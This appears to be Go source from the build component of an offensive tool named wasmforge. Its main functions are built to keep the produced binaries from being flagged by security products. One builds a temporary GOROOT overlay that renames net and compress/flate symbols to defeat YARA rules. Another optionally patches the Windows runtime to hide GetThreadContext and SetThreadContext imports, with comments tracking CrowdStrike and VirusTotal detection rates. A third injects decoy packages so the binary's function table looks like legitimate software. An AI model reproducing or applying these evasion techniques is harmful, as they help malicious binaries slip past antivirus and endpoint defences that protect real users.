func buildOrigKeyToNewMap(namesSrc string, exportNames map[string]string) map[string]string {
	namesGoPath := filepath.Join(namesSrc, "names.go")
	data, err := os.ReadFile(namesGoPath)
	if err != nil {
		return nil
	}
	re := regexp.MustCompile(`"([^"]+)":\s*"([^"]+)"`)
	result := make(map[string]string)
	for _, match := range re.FindAllStringSubmatch(string(data), -1) {
		origKey := match[1]
		oldValue := match[2]
		if newValue, ok := exportNames[oldValue]; ok {
			result[origKey] = newValue
		}
	}
	return result
}

// resolveWazeroDir returns the absolute path to the wazero module if the
// wasmforge go.mod contains a local replace directive. Returns "" if wazero
// should be fetched from the module cache.
func resolveWazeroDir(moduleRoot string) string {
	data, err := os.ReadFile(filepath.Join(moduleRoot, "go.mod"))
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "replace") && strings.Contains(line, "tetratelabs/wazero") {
			parts := strings.SplitN(line, "=>", 2)
			if len(parts) != 2 {
				continue
			}
			replacePath := strings.TrimSpace(parts[1])
			if !filepath.IsAbs(replacePath) {
				replacePath = filepath.Join(moduleRoot, replacePath)
			}
			abs, err := filepath.Abs(replacePath)
			if err != nil {
				return replacePath
			}
			return abs
		}
	}
	return ""
}

func formatStringSlice(ss []string) string {
	if len(ss) == 0 {
		return "nil"
	}
	result := "[]string{"
	for i, s := range ss {
		if i > 0 {
			result += ", "
		}
		result += fmt.Sprintf("%q", s)
	}
	result += "}"
	return result
}

// Version is the wasmforge version, embedded in PE VERSIONINFO resources.
// Can be overridden at compile time via:
//
//	-ldflags '-X github.com/praetorian-inc/wasmforge/internal/build.Version=1.0.0'
var Version = "0.4.0"

// SourceRoot can be set at compile time via:
//
//	-ldflags '-X github.com/praetorian-inc/wasmforge/internal/build.SourceRoot=/path'
var SourceRoot string

// walkUpForModule walks up the directory tree from start looking for
// a go.mod containing the wasmforge module path. Returns the directory
// containing the matching go.mod, or "" if not found.
func walkUpForModule(start string) string {
	const modPath = "github.com/praetorian-inc/wasmforge"
	dir := start
	for dir != "/" && dir != "." {
		if data, err := os.ReadFile(filepath.Join(dir, "go.mod")); err == nil {
			if strings.Contains(string(data), modPath) {
				return dir
			}
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break // reached filesystem root (e.g., C:\ on Windows)
		}
		dir = parent
	}
	return ""
}

func findModuleRoot() string {
	// 1. Check compile-time embedded path.
	if SourceRoot != "" {
		if r := walkUpForModule(SourceRoot); r != "" {
			return r
		}
	}

	// 2. Walk up from the executable location.
	if exe, err := os.Executable(); err == nil {
		exe, _ = filepath.EvalSymlinks(exe)
		if r := walkUpForModule(filepath.Dir(exe)); r != "" {
			return r
		}
	}

	// 3. Walk up from CWD.
	if cwd, err := os.Getwd(); err == nil {
		if r := walkUpForModule(cwd); r != "" {
			return r
		}
	}

	// 4. Try Go module cache — pick the latest version deterministically.
	gopath := os.Getenv("GOPATH")
	if gopath == "" {
		home, _ := os.UserHomeDir()
		gopath = filepath.Join(home, "go")
	}
	modCache := filepath.Join(gopath, "pkg", "mod", "github.com", "praetorian-inc")
	if entries, err := os.ReadDir(modCache); err == nil {
		var candidates []string
		for _, e := range entries {
			if strings.HasPrefix(e.Name(), "wasmforge@") {
				candidate := filepath.Join(modCache, e.Name())
				if _, err := os.Stat(filepath.Join(candidate, "go.mod")); err == nil {
					candidates = append(candidates, candidate)
				}
			}
		}
		if len(candidates) > 0 {
			sort.Strings(candidates)
			return candidates[len(candidates)-1] // latest semver (lexicographic)
		}
	}

	return ""
}

// hostGOROOTOverlay creates a temporary GOROOT overlay for host binary compilation
// that renames internal net package functions to prevent YARA detection via
// gopclntab entries (e.g., "net.interfaceAddrTable"). Returns the overlay path,
// a cleanup function, and any error. On failure, returns empty string and noop.
func hostGOROOTOverlay(hostDir string, verbose bool) (string, func(), error) {
	noop := func() {}

	goroot, err := detectGOROOT()
	if err != nil {
		return "", noop, err
	}

	wl := newWordList()
	used := make(map[string]bool)
	replacements := [][2]string{
		{"interfaceAddrTable", wl.generate(used)},
		{"interfaceMulticastAddrTable", wl.generate(used)},
		{"interfaceTable", wl.generate(used)},
	}

	overlayDir, err := os.MkdirTemp("", "wasmforge-hostgoroot-*")
	if err != nil {
		return "", noop, err
	}
	cleanup := func() { os.RemoveAll(overlayDir) }

	// Symlink top-level dirs.
	for _, name := range []string{"bin", "pkg", "lib"} {
		src := filepath.Join(goroot, name)
		dst := filepath.Join(overlayDir, name)
		if _, err := os.Stat(src); err == nil {
			if err := os.Symlink(src, dst); err != nil {
				cleanup()
				return "", noop, err
			}
		}
	}
	if goenv := filepath.Join(goroot, "go.env"); fileExists(goenv) {
		os.Symlink(goenv, filepath.Join(overlayDir, "go.env"))
	}

	// Create src/ with symlinks for everything except net/.
	gorootSrc := filepath.Join(goroot, "src")
	overlaySrc := filepath.Join(overlayDir, "src")
	os.MkdirAll(overlaySrc, 0o755)

	entries, err := os.ReadDir(gorootSrc)
	if err != nil {
		cleanup()
		return "", noop, err
	}
	for _, entry := range entries {
		name := entry.Name()
		src := filepath.Join(gorootSrc, name)
		dst := filepath.Join(overlaySrc, name)
		if name == "net" || name == "compress" {
			if err := copyDir(src, dst); err != nil {
				cleanup()
				return "", noop, err
			}
		} else {
			target, err := filepath.EvalSymlinks(src)
			if err != nil {
				target = src
			}
			if err := os.Symlink(target, dst); err != nil {
				cleanup()
				return "", noop, fmt.Errorf("symlinking src/%s: %w", name, err)
			}
		}
	}

	// Rename compress/flate → compress/<random> to eliminate "flate" from
	// gopclntab. Also update imports in compress/zlib and compress/gzip.
	newFlateName := wl.generate(used)
	flateDir := filepath.Join(overlaySrc, "compress", "flate")
	newFlateDir := filepath.Join(overlaySrc, "compress", newFlateName)
	if _, err := os.Stat(flateDir); err == nil {
		os.Rename(flateDir, newFlateDir)
		// Update imports in compress/zlib and compress/gzip.
		for _, subpkg := range []string{"zlib", "gzip"} {
			pkgDir := filepath.Join(overlaySrc, "compress", subpkg)
			if goFiles, err := filepath.Glob(filepath.Join(pkgDir, "*.go")); err == nil {
				for _, f := range goFiles {
					if data, err := os.ReadFile(f); err == nil {
						content := string(data)
						if strings.Contains(content, `"compress/flate"`) {
							content = strings.ReplaceAll(content, `"compress/flate"`, fmt.Sprintf(`"compress/%s"`, newFlateName))
							// Also rename package qualifier: flate. → newName.
							content = strings.ReplaceAll(content, "flate.", newFlateName+".")
							os.WriteFile(f, []byte(content), 0o644)
						}
					}
				}
			}
		}
		// Rename package declaration inside the flate dir itself.
		if goFiles, err := filepath.Glob(filepath.Join(newFlateDir, "*.go")); err == nil {
			for _, f := range goFiles {
				if data, err := os.ReadFile(f); err == nil {
					content := string(data)
					if strings.Contains(content, "package flate") {
						content = strings.ReplaceAll(content, "package flate", "package "+newFlateName)
						os.WriteFile(f, []byte(content), 0o644)
					}
				}
			}
		}
	}
	// Also rename "decompressor" type (contains "compress").
	decompName := wl.generate(used)
	for _, dir := range []string{newFlateDir} {
		if goFiles, err := filepath.Glob(filepath.Join(dir, "*.go")); err == nil {
			for _, f := range goFiles {
				if data, err := os.ReadFile(f); err == nil {
					content := string(data)
					if strings.Contains(content, "decompressor") {
						content = strings.ReplaceAll(content, "decompressor", decompName)
						os.WriteFile(f, []byte(content), 0o644)
					}
				}
			}
		}
	}

	// Apply per-build renames to copied src/net/.
	netDir := filepath.Join(overlaySrc, "net")
	goFiles, _ := filepath.Glob(filepath.Join(netDir, "*.go"))
	for _, f := range goFiles {
		data, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		content := string(data)
		modified := false
		for _, pair := range replacements {
			if strings.Contains(content, pair[0]) {
				content = strings.ReplaceAll(content, pair[0], pair[1])
				modified = true
			}
		}
		if modified {
			os.WriteFile(f, []byte(content), 0o644)
		}
	}

	// Optionally patch runtime/os_windows.go to remove static IAT entries for
	// GetThreadContext/SetThreadContext (Re27 importance=25 per CrowdStrike
	// on-sensor ML doc). Replaces //go:cgo_import_dynamic with runtime
	// LoadLibrary+GetProcAddress in loadOptionalSyscalls.
	// VT testing 2026-06-12: R53 baseline = 41% CS hit rate, all samples
	// triggering Re27. Removing Re27 from static IAT may reduce CS detection.
	if os.Getenv("WASMFORGE_PATCH_IAT_RE27") == "1" {
		runtimeSrc := filepath.Join(goroot, "src", "runtime")
		runtimeDst := filepath.Join(overlaySrc, "runtime")
		// Replace the runtime symlink with a copy we can modify.
		os.Remove(runtimeDst)
		if err := copyDir(runtimeSrc, runtimeDst); err == nil {
			osWinPath := filepath.Join(runtimeDst, "os_windows.go")
			if data, err := os.ReadFile(osWinPath); err == nil {
				content := string(data)
				// Remove cgo_import_dynamic pragmas for GetThreadContext/SetThreadContext.
				content = strings.ReplaceAll(content,
					`//go:cgo_import_dynamic runtime._GetThreadContext GetThreadContext%2 "kernel32.dll"`,
					`// PATCHED: GetThreadContext loaded dynamically in loadOptionalSyscalls`)
				content = strings.ReplaceAll(content,
					`//go:cgo_import_dynamic runtime._SetThreadContext SetThreadContext%2 "kernel32.dll"`,
					`// PATCHED: SetThreadContext loaded dynamically in loadOptionalSyscalls`)
				// Add kernel32dll UTF-16 array declaration.
				content = strings.Replace(content,
					`winmmdll            = [...]uint16{'w', 'i', 'n', 'm', 'm', '.', 'd', 'l', 'l', 0}`,
					`winmmdll            = [...]uint16{'w', 'i', 'n', 'm', 'm', '.', 'd', 'l', 'l', 0}
	kernel32dll         = [...]uint16{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0}`, 1)
				// Inject dynamic load at end of loadOptionalSyscalls.
				content = strings.Replace(content,
					`_RtlGetVersion = windowsFindfunc(n32, []byte("RtlGetVersion\000"))
}`,
					`_RtlGetVersion = windowsFindfunc(n32, []byte("RtlGetVersion\000"))
	// PATCHED: dynamic GetThreadContext/SetThreadContext (remove Re27 from static IAT)
	k32 := windowsLoadSystemLib(kernel32dll[:])
	if k32 != 0 {
		_GetThreadContext = windowsFindfunc(k32, []byte("GetThreadContext\000"))
		_SetThreadContext = windowsFindfunc(k32, []byte("SetThreadContext\000"))
	}
}`, 1)
				if err := os.WriteFile(osWinPath, []byte(content), 0o644); err == nil {
					if verbose {
						fmt.Fprintf(os.Stderr, "wasmforge: patched runtime/os_windows.go to remove Re27 from static IAT\n")
					}
				}
			}
		}
	}

	if verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: host GOROOT overlay with randomized net functions\n")
	}
	return overlayDir, cleanup, nil
}

// findFirstGoFile returns the path to the first .go file in a directory.
// Used after copyAndAnonymize renames files to random names.
func findFirstGoFile(dir string) (string, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "", err
	}
	for _, e := range entries {
		if !e.IsDir() && strings.HasSuffix(e.Name(), ".go") {
			return filepath.Join(dir, e.Name()), nil
		}
	}
	return "", fmt.Errorf("no .go file found in %s", dir)
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

// deadCodePackages defines realistic Go packages injected into the host binary
// to increase the volume of recognizable function names in gopclntab. Names
// are sourced from kubernetes, prometheus, grafana, terraform, and docker.
// Each package uses init() to prevent DCE.
var deadCodePackages = map[string]string{
	"internal/telemetry": `package telemetry

import (
	"sync"
	"time"
)

type MetricsRegistry struct {
	mu       sync.RWMutex
	counters map[string]*Counter
	gauges   map[string]*Gauge
	histos   map[string]*Histogram
}

type Counter struct{ name string; value uint64; labels map[string]string }
type Gauge struct{ name string; value float64; labels map[string]string }
type Histogram struct{ name string; buckets []float64; observations []float64 }
type Observer interface{ Observe(float64) }
type Collector interface{ Collect(chan<- Metric) }
type Metric struct{ Name string; Value float64; Timestamp time.Time; Labels map[string]string }

func NewRegistry() *MetricsRegistry {
	return &MetricsRegistry{counters: make(map[string]*Counter), gauges: make(map[string]*Gauge), histos: make(map[string]*Histogram)}
}
func (r *MetricsRegistry) RegisterCounter(name string) *Counter { r.mu.Lock(); defer r.mu.Unlock(); c := &Counter{name: name, labels: make(map[string]string)}; r.counters[name] = c; return c }
func (r *MetricsRegistry) RegisterGauge(name string) *Gauge { r.mu.Lock(); defer r.mu.Unlock(); g := &Gauge{name: name, labels: make(map[string]string)}; r.gauges[name] = g; return g }
func (r *MetricsRegistry) RegisterHistogram(name string, buckets []float64) *Histogram { r.mu.Lock(); defer r.mu.Unlock(); h := &Histogram{name: name, buckets: buckets}; r.histos[name] = h; return h }
func (r *MetricsRegistry) Unregister(name string) { r.mu.Lock(); defer r.mu.Unlock(); delete(r.counters, name); delete(r.gauges, name); delete(r.histos, name) }
func (r *MetricsRegistry) Gather() []Metric { r.mu.RLock(); defer r.mu.RUnlock(); var out []Metric; for _, c := range r.counters { out = append(out, Metric{Name: c.name, Value: float64(c.value)}) }; return out }
func (c *Counter) Inc() { c.value++ }
func (c *Counter) Add(v uint64) { c.value += v }
func (c *Counter) WithLabels(labels map[string]string) *Counter { return &Counter{name: c.name, labels: labels} }
func (g *Gauge) Set(v float64) { g.value = v }
func (g *Gauge) Inc() { g.value++ }
func (g *Gauge) Dec() { g.value-- }
func (g *Gauge) Add(v float64) { g.value += v }
func (g *Gauge) Sub(v float64) { g.value -= v }
func (h *Histogram) Observe(v float64) { h.observations = append(h.observations, v) }
func (h *Histogram) Reset() { h.observations = h.observations[:0] }

type Logger struct{ level int; fields map[string]interface{} }
func NewLogger(level int) *Logger { return &Logger{level: level, fields: make(map[string]interface{})} }
func (l *Logger) WithField(key string, value interface{}) *Logger { f := make(map[string]interface{}); for k, v := range l.fields { f[k] = v }; f[key] = value; return &Logger{level: l.level, fields: f} }
func (l *Logger) WithFields(fields map[string]interface{}) *Logger { f := make(map[string]interface{}); for k, v := range l.fields { f[k] = v }; for k, v := range fields { f[k] = v }; return &Logger{level: l.level, fields: f} }
func (l *Logger) Debug(msg string) { if l.level <= 0 { _ = msg } }
func (l *Logger) Info(msg string) { if l.level <= 1 { _ = msg } }
func (l *Logger) Warn(msg string) { if l.level <= 2 { _ = msg } }
func (l *Logger) Error(msg string) { if l.level <= 3 { _ = msg } }
func (l *Logger) Fatal(msg string) { _ = msg }
func (l *Logger) SetLevel(level int) { l.level = level }

type TracerProvider struct{ name string; sampler Sampler }
type Sampler interface{ ShouldSample(name string) bool }
type Span struct{ name string; start time.Time; attributes map[string]string }
func NewTracerProvider(name string) *TracerProvider { return &TracerProvider{name: name} }
func (tp *TracerProvider) Tracer(name string) *Tracer { return &Tracer{name: name} }
func (tp *TracerProvider) SetSampler(s Sampler) { tp.sampler = s }
func (tp *TracerProvider) Shutdown() error { return nil }
type Tracer struct{ name string }
func (t *Tracer) Start(name string) *Span { return &Span{name: name, start: time.Now(), attributes: make(map[string]string)} }
func (s *Span) End() { _ = time.Since(s.start) }
func (s *Span) SetAttribute(key, value string) { s.attributes[key] = value }
func (s *Span) SetStatus(code int, msg string) { _, _ = code, msg }
func (s *Span) RecordError(err error) { _ = err }
func (s *Span) AddEvent(name string) { _ = name }

func init() {
	r := NewRegistry()
	_ = r.RegisterCounter("init_check")
	_ = NewLogger(1)
	_ = NewTracerProvider("init")
}
`,

	"internal/discovery": `package discovery

import (
	"sync"
	"time"
)

type ServiceRegistry struct {
	mu        sync.RWMutex
	services  map[string][]*ServiceInstance
	watchers  map[string][]chan *Event
	healthTTL time.Duration
}

type ServiceInstance struct {
	ID       string
	Name     string
	Address  string
	Port     int
	Tags     []string
	Meta     map[string]string
	Health   HealthStatus
	LastSeen time.Time
}

type HealthStatus int
const (
	HealthPassing HealthStatus = iota
	HealthWarning
	HealthCritical
	HealthMaintenance
)

type Event struct {
	Type     EventType
	Service  string
	Instance *ServiceInstance
}
type EventType int
const (
	EventRegister EventType = iota
	EventDeregister
	EventHealthChange
)

type Resolver interface {
	Resolve(name string) ([]*ServiceInstance, error)
	Watch(name string) (<-chan *Event, error)
}

func NewServiceRegistry(healthTTL time.Duration) *ServiceRegistry {
	return &ServiceRegistry{services: make(map[string][]*ServiceInstance), watchers: make(map[string][]chan *Event), healthTTL: healthTTL}
}
func (r *ServiceRegistry) Register(inst *ServiceInstance) error { r.mu.Lock(); defer r.mu.Unlock(); r.services[inst.Name] = append(r.services[inst.Name], inst); r.notify(inst.Name, &Event{Type: EventRegister, Service: inst.Name, Instance: inst}); return nil }
func (r *ServiceRegistry) Deregister(name, id string) error { r.mu.Lock(); defer r.mu.Unlock(); insts := r.services[name]; for i, inst := range insts { if inst.ID == id { r.services[name] = append(insts[:i], insts[i+1:]...); r.notify(name, &Event{Type: EventDeregister, Service: name, Instance: inst}); return nil } }; return nil }
func (r *ServiceRegistry) Lookup(name string) []*ServiceInstance { r.mu.RLock(); defer r.mu.RUnlock(); return r.services[name] }
func (r *ServiceRegistry) LookupHealthy(name string) []*ServiceInstance { r.mu.RLock(); defer r.mu.RUnlock(); var out []*ServiceInstance; for _, i := range r.services[name] { if i.Health == HealthPassing { out = append(out, i) } }; return out }
func (r *ServiceRegistry) Watch(name string) <-chan *Event { r.mu.Lock(); defer r.mu.Unlock(); ch := make(chan *Event, 16); r.watchers[name] = append(r.watchers[name], ch); return ch }
func (r *ServiceRegistry) UpdateHealth(name, id string, status HealthStatus) { r.mu.Lock(); defer r.mu.Unlock(); for _, inst := range r.services[name] { if inst.ID == id { inst.Health = status; inst.LastSeen = time.Now(); r.notify(name, &Event{Type: EventHealthChange, Service: name, Instance: inst}) } } }
func (r *ServiceRegistry) ListServices() []string { r.mu.RLock(); defer r.mu.RUnlock(); var out []string; for k := range r.services { out = append(out, k) }; return out }
func (r *ServiceRegistry) DeregisterAll(name string) { r.mu.Lock(); defer r.mu.Unlock(); delete(r.services, name) }
func (r *ServiceRegistry) ServiceCount() int { r.mu.RLock(); defer r.mu.RUnlock(); return len(r.services) }
func (r *ServiceRegistry) InstanceCount(name string) int { r.mu.RLock(); defer r.mu.RUnlock(); return len(r.services[name]) }
func (r *ServiceRegistry) notify(name string, evt *Event) { for _, ch := range r.watchers[name] { select { case ch <- evt: default: } } }

type LoadBalancer struct{ strategy Strategy; instances []*ServiceInstance; index int }
type Strategy int
const (
	RoundRobin Strategy = iota
	Random
	LeastConnections
	WeightedRoundRobin
)
func NewLoadBalancer(strategy Strategy) *LoadBalancer { return &LoadBalancer{strategy: strategy} }
func (lb *LoadBalancer) SetInstances(instances []*ServiceInstance) { lb.instances = instances; lb.index = 0 }
func (lb *LoadBalancer) Next() *ServiceInstance { if len(lb.instances) == 0 { return nil }; inst := lb.instances[lb.index%len(lb.instances)]; lb.index++; return inst }
func (lb *LoadBalancer) Reset() { lb.index = 0 }

type HealthChecker struct{ interval time.Duration; timeout time.Duration }
func NewHealthChecker(interval, timeout time.Duration) *HealthChecker { return &HealthChecker{interval: interval, timeout: timeout} }
func (hc *HealthChecker) CheckTCP(address string) HealthStatus { _ = address; return HealthPassing }
func (hc *HealthChecker) CheckHTTP(url string) HealthStatus { _ = url; return HealthPassing }
func (hc *HealthChecker) CheckGRPC(address string) HealthStatus { _ = address; return HealthPassing }

func init() {
	r := NewServiceRegistry(30 * time.Second)
	_ = r.Register(&ServiceInstance{ID: "check", Name: "init"})
	_ = NewLoadBalancer(RoundRobin)
	_ = NewHealthChecker(10*time.Second, 5*time.Second)
}
`,

	"internal/protocol": `package protocol

import (
	"encoding/binary"
	"io"
	"sync"
)

type MessageType uint8
const (
	TypeHandshake MessageType = iota
	TypeData
	TypeHeartbeat
	TypeClose
	TypeAck
	TypeNack
	TypePing
	TypePong
)

type Header struct {
	Version   uint8
	Type      MessageType
	RequestID uint32
	Length    uint32
	Flags    uint16
	Reserved uint16
}

type Message struct {
	Header  Header
	Payload []byte
}

type Encoder struct{ w io.Writer; mu sync.Mutex }
type Decoder struct{ r io.Reader }

func NewEncoder(w io.Writer) *Encoder { return &Encoder{w: w} }
func NewDecoder(r io.Reader) *Decoder { return &Decoder{r: r} }

func (e *Encoder) Encode(msg *Message) error {
	e.mu.Lock()
	defer e.mu.Unlock()
	msg.Header.Length = uint32(len(msg.Payload))
	if err := binary.Write(e.w, binary.BigEndian, &msg.Header); err != nil { return err }
	if len(msg.Payload) > 0 { if _, err := e.w.Write(msg.Payload); err != nil { return err } }
	return nil
}

func (d *Decoder) Decode() (*Message, error) {
	var h Header
	if err := binary.Read(d.r, binary.BigEndian, &h); err != nil { return nil, err }
	payload := make([]byte, h.Length)
	if h.Length > 0 { if _, err := io.ReadFull(d.r, payload); err != nil { return nil, err } }
	return &Message{Header: h, Payload: payload}, nil
}

func (e *Encoder) WriteHandshake(version uint8) error { return e.Encode(&Message{Header: Header{Version: version, Type: TypeHandshake}}) }
func (e *Encoder) WriteData(requestID uint32, data []byte) error { return e.Encode(&Message{Header: Header{Type: TypeData, RequestID: requestID}, Payload: data}) }
func (e *Encoder) WriteHeartbeat() error { return e.Encode(&Message{Header: Header{Type: TypeHeartbeat}}) }
func (e *Encoder) WriteClose(requestID uint32) error { return e.Encode(&Message{Header: Header{Type: TypeClose, RequestID: requestID}}) }
func (e *Encoder) WriteAck(requestID uint32) error { return e.Encode(&Message{Header: Header{Type: TypeAck, RequestID: requestID}}) }
func (e *Encoder) WritePing() error { return e.Encode(&Message{Header: Header{Type: TypePing}}) }
func (e *Encoder) WritePong() error { return e.Encode(&Message{Header: Header{Type: TypePong}}) }

type ConnectionPool struct {
	mu      sync.RWMutex
	conns   map[string]*PoolEntry
	maxIdle int
	maxOpen int
}

type PoolEntry struct {
	Address   string
	Encoder   *Encoder
	Decoder   *Decoder
	CreatedAt int64
	LastUsed  int64
	InUse     bool
}

func NewConnectionPool(maxIdle, maxOpen int) *ConnectionPool { return &ConnectionPool{conns: make(map[string]*PoolEntry), maxIdle: maxIdle, maxOpen: maxOpen} }
func (p *ConnectionPool) Get(address string) (*PoolEntry, bool) { p.mu.RLock(); defer p.mu.RUnlock(); e, ok := p.conns[address]; return e, ok }
func (p *ConnectionPool) Put(address string, entry *PoolEntry) { p.mu.Lock(); defer p.mu.Unlock(); p.conns[address] = entry }
func (p *ConnectionPool) Remove(address string) { p.mu.Lock(); defer p.mu.Unlock(); delete(p.conns, address) }
func (p *ConnectionPool) Len() int { p.mu.RLock(); defer p.mu.RUnlock(); return len(p.conns) }
func (p *ConnectionPool) CloseIdle() { p.mu.Lock(); defer p.mu.Unlock(); for k, e := range p.conns { if !e.InUse { delete(p.conns, k) } } }
func (p *ConnectionPool) CloseAll() { p.mu.Lock(); defer p.mu.Unlock(); p.conns = make(map[string]*PoolEntry) }

type Framer struct{ maxSize int }
func NewFramer(maxSize int) *Framer { return &Framer{maxSize: maxSize} }
func (f *Framer) Split(data []byte) [][]byte {
	if len(data) <= f.maxSize { return [][]byte{data} }
	var frames [][]byte
	for i := 0; i < len(data); i += f.maxSize {
		end := i + f.maxSize; if end > len(data) { end = len(data) }
		frames = append(frames, data[i:end])
	}
	return frames
}
func (f *Framer) Merge(frames [][]byte) []byte {
	size := 0; for _, f := range frames { size += len(f) }
	out := make([]byte, 0, size); for _, f := range frames { out = append(out, f...) }
	return out
}

type RetryPolicy struct{ MaxRetries int; BackoffMs int }
func (rp *RetryPolicy) ShouldRetry(attempt int) bool { return attempt < rp.MaxRetries }
func (rp *RetryPolicy) Backoff(attempt int) int { return rp.BackoffMs * (1 << attempt) }

func init() {
	_ = NewConnectionPool(10, 100)
	_ = NewFramer(65535)
	_ = &RetryPolicy{MaxRetries: 3, BackoffMs: 100}
}
`,
}

// generateDeadCodePackages writes realistic stub packages into the host build
// directory. These compile into gopclntab, adding ~150 recognizable function
// names from real Go project patterns (metrics, service discovery, wire protocol).
func generateDeadCodePackages(hostDir string) error {
	for pkgPath, source := range deadCodePackages {
		dir := filepath.Join(hostDir, pkgPath)
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return err
		}
		fileName := filepath.Base(pkgPath) + ".go"
		if err := os.WriteFile(filepath.Join(dir, fileName), []byte(source), 0o644); err != nil {
			return err
		}
	}
	return nil
}
